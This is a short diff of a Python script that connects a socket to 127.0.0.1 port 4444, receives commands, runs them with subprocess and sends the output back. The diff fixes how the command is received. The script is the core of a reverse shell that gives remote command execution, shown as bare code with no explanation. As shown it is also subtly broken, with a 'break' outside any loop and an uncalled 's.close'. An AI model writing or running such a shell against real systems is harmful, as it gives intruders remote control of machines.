@@ -4,7 +4,7 @@ import subprocess
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("127.0.0.1", 4444))
 
-commands.recv(1024).decode()
+command=s.recv(1024).decode()
 
 if command=="exit":
     break
@@ -12,3 +12,5 @@ if command=="exit":
 result=subprocess.getoutput(command)
 s.send(result.encode())
 s.close
+
+
